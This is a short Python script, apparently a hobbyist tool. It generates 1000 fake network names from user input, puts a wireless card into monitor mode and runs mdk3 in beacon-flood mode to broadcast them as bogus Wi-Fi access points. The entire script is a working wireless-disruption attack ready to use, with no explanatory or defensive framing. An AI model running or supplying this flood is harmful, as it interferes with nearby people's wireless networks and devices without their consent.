import subprocess

name = input("what would you like to spam?: ")

with open('names.txt','w') as fp:

        for i in range(1000):
                fp.write(f"{name}_69_{i+1}\n")


try:
    subprocess.call('sudo ifconfig wlan1 down'.split())
    subprocess.call('sudo iwconfig wlan1 mode monitor'.split())
    subprocess.call('sudo ifconfig wlan1 up'.split())
    subprocess.call('sudo mdk3 wlan1 b -f names.txt -s 6969'.split())

except KeyboardInterrupt:
    subprocess.call('sudo ifconfig wlan1 down'.split())
    subprocess.call('sudo iwconfig wlan1 mode managed'.split())
    subprocess.call('sudo ifconfig wlan1 up'.split())
    subprocess.call('clear')

